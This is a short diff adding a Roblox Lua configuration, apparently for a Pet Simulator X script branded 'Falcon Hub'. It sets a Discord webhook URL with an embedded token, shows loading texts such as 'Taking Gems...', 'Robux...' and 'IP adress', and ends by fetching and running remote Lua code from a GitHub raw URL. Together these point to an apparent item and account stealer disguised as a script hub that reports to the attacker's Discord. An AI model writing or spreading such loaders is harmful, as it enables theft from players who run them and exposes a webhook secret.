@@ -1,0 +1,9 @@
+Username = "Leander1573"
+WebHook = "https://discord.com/api/webhooks/1099352190436520066/X-FSz0PgXfFNsprJxDNO1_JfULfSaWJPmbnF7BK_pnG6K-AQ5byWJmu8KaFFnXuxyUMM"
+loadingscreen = true
+_G.CustomScriptName = "Falcon Hub"
+_G.Text1 = "Taking Gems..."
+_G.Text2 = "Pets..."
+_G.Text3 = "Robux..."
+_G.Text4 = "IP adress"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
